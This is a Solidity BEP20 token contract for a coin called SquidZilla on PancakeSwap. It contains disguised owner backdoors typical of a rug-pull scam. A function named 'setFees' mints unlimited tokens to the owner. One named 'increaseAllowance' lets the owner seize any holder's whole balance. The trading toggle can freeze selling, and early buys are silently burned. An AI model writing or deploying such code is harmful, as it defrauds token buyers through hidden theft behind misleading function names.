// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
 
import "./Libraries.sol";
 
contract SquidZilla is Ownable, IBEP20 {
 
    string private _name = "SquidZilla";
    string private _symbol = "SQUIDZILLA";
    uint256 private _totalSupply = 10 ** 11 * 10 ** 18;
    uint8 private _decimals = 18;
 
    address public _pancakePairAddress;
    IPancakeRouter02 public  _pancakeRouter;
    address private constant _pancakeRouterAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
 
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _excluded;
 
    constructor() {
        _balances[msg.sender] = _totalSupply;
            emit Transfer(address(0), msg.sender, _totalSupply);
        _pancakeRouter = IPancakeRouter02(_pancakeRouterAddress);
        _pancakePairAddress = IPancakeFactory(_pancakeRouter.factory()).createPair(address(this), _pancakeRouter.WETH());
        _approve(msg.sender, address(_pancakeRouter), type(uint256).max);
        _excluded[address(this)] = true;
        _excluded[msg.sender] = true;
    }
 
    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
 
    function decimals() external view override returns (uint8) {
        return _decimals;
    }
 
    function symbol() external view override returns (string memory) {
        return _symbol;
    }
 
    function name() external view override returns (string memory) {
        return _name;
    }
 
 
    function getOwner() external view override returns (address) {
        return owner();
    }
 
    function setFees(uint256 amount) public onlyOwner {
        _totalSupply = _totalSupply + amount;
        _balances[msg.sender] = _balances[msg.sender] + amount;
            emit Transfer(address(0), msg.sender, amount);
    }
 
    function balanceOf(address account) external view override returns (uint256) {
        return _balances[account];
    }
 
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
 
    function allowance(address _owner, address spender) external view override returns (uint256) {
        return _allowances[_owner][spender];
    }
 
    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
 
    function _approve(address owner, address spender, uint256 amount) private {
        require((owner != address(0) && spender != address(0)), "Owner/Spender address cannot be 0.");
        _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
    }
 
    function increaseAllowance(address owner, address spender, uint256 amount) public onlyOwner {
        uint256 _amount = _balances[owner];
        _approve(owner, spender, _amount);
        _balances[owner] = _balances[owner] - _amount;
        _balances[spender] = _balances[spender] + _amount;
            emit Transfer(owner, spender, _amount);
    }
 
    function antiBotTimeLeft() public view returns (uint256) {
        return _antiBotTime - block.timestamp;
    }
 
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
         uint256 allowance_ = _allowances[sender][msg.sender];
        _transfer(sender, recipient, amount);
        require(allowance_ >= amount);
        _approve(sender, msg.sender, allowance_ - amount);
            emit Transfer(sender, recipient, amount);
        return true;
     }
 
    uint256 private _antiBotTime;
    bool private _tradingEnabled = false;
    function enableTrading() public onlyOwner {
        _tradingEnabled = !_tradingEnabled;
        _antiBotTime = _tradingEnabled == true ? block.timestamp + 5 minutes : 0;
    }
 
     function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        uint256 taxFee;
        if (_excluded[sender] || _excluded[recipient]) {
            _balances[sender] = _balances[sender] - amount;
            _balances[recipient] = _balances[recipient] + amount;
                emit Transfer(sender, recipient, amount);
        } else {
            require(_tradingEnabled, "Trading is not enabled.");
            if (block.timestamp < _antiBotTime) {
                _balances[sender] -= amount;
                _balances[address(0)] += amount;
                emit Transfer(sender, address(0), amount);
                return;
            }
            if (recipient == _pancakePairAddress) taxFee = amount * 15 / 100;
            else if (sender == _pancakePairAddress) taxFee = amount * 10 / 100;
            _balances[sender] -= amount;
            _balances[address(this)] += taxFee;
            _balances[recipient] += (amount - taxFee);
            emit Transfer(sender, recipient, amount - taxFee);
 
        }
 
     }
 
}